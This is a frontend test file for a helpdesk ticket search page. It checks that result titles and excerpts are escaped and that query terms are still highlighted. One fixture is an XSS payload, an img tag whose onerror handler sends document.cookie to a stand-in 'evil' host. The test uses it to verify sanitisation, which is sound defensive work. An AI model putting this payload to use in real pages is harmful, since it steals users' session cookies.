import { describe, it, expect, vi, beforeEach } from "vitest";
import { render, screen, waitFor } from "@testing-library/react";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { I18nextProvider } from "react-i18next";
import i18n from "@/i18n";
import { SearchPage } from "./SearchPage";

const navigate = vi.fn();
let searchParams: { q?: string; offset?: number } = { q: "xss" };

const search = vi.fn();
const searchKb = vi.fn();

vi.mock("@tanstack/react-router", () => ({
  useNavigate: () => navigate,
  useSearch: () => searchParams,
  Link: ({
    children,
    to,
    params,
    className,
    ...rest
  }: {
    children: React.ReactNode;
    to: string;
    params?: Record<string, string>;
    className?: string;
    "data-testid"?: string;
  }) => (
    <a
      href={`${to}${params ? `/${Object.values(params).join("/")}` : ""}`}
      className={className}
      {...rest}
    >
      {children}
    </a>
  ),
}));

vi.mock("@/lib/api", () => ({
  api: {
    search: (...args: unknown[]) => search(...args),
    searchKb: (...args: unknown[]) => searchKb(...args),
  },
}));

function renderPage() {
  const qc = new QueryClient({
    defaultOptions: { queries: { retry: false }, mutations: { retry: false } },
  });
  return render(
    <QueryClientProvider client={qc}>
      <I18nextProvider i18n={i18n}>
        <SearchPage />
      </I18nextProvider>
    </QueryClientProvider>,
  );
}

describe("SearchPage XSS", () => {
  beforeEach(() => {
    navigate.mockReset();
    search.mockReset();
    searchKb.mockReset();
    searchParams = { q: "xss" };
    searchKb.mockResolvedValue({ hits: [], estimated_total: 0, query: "xss" });
  });

  it("does not inject raw <img>/handlers from title or excerpt into the DOM", async () => {
    const payload = `<em>x</em><img src=x onerror="fetch('//evil/'+document.cookie)">xss`;
    search.mockResolvedValue({
      query: "xss",
      estimated_total: 1,
      hits: [
        {
          id: 99,
          tn: "20240721000099",
          title: payload,
          excerpt: payload,
          queue_id: 1,
          queue_name: "Support",
          state: "open",
          state_type: "open",
          priority: "3 normal",
          owner_login: "agent1",
          customer_id: null,
          create_time: null,
          change_time: null,
        },
      ],
    });

    renderPage();

    await waitFor(() => {
      expect(screen.getByTestId("search-hit-99")).toBeInTheDocument();
    });

    const hit = screen.getByTestId("search-hit-99");
    // No live elements / event-handler attributes — payload is text only.
    expect(hit.querySelector("img")).toBeNull();
    expect(hit.querySelector("em")).toBeNull();
    expect(hit.innerHTML).not.toMatch(/<img\b/i);
    expect(hit.innerHTML).not.toMatch(/<em\b/i);
    // Angle brackets from the payload are text entities, not live tags.
    expect(hit.innerHTML).toContain("&lt;");
    // Query term still highlighted.
    expect(hit.querySelector("mark")).not.toBeNull();
    expect(hit.textContent?.toLowerCase()).toContain("xss");
    // Escaped payload may still *contain the word* onerror as text — that is safe.
    expect(hit.textContent).toContain("onerror");
  });

  it("highlights a safe query term with <mark>", async () => {
    searchParams = { q: "printer" };
    search.mockResolvedValue({
      query: "printer",
      estimated_total: 1,
      hits: [
        {
          id: 1,
          tn: "20240721000001",
          title: "Please fix the printer jam",
          excerpt: "The printer is offline",
          queue_id: 1,
          queue_name: "Support",
          state: "open",
          state_type: "open",
          priority: "3 normal",
          owner_login: "agent1",
          customer_id: null,
          create_time: null,
          change_time: null,
        },
      ],
    });
    searchKb.mockResolvedValue({ hits: [], estimated_total: 0, query: "printer" });

    renderPage();

    await waitFor(() => {
      expect(screen.getByTestId("search-hit-1")).toBeInTheDocument();
    });
    const hit = screen.getByTestId("search-hit-1");
    const marks = hit.querySelectorAll("mark");
    expect(marks.length).toBeGreaterThan(0);
    expect([...marks].some((m) => m.textContent?.toLowerCase() === "printer")).toBe(
      true,
    );
  });
});
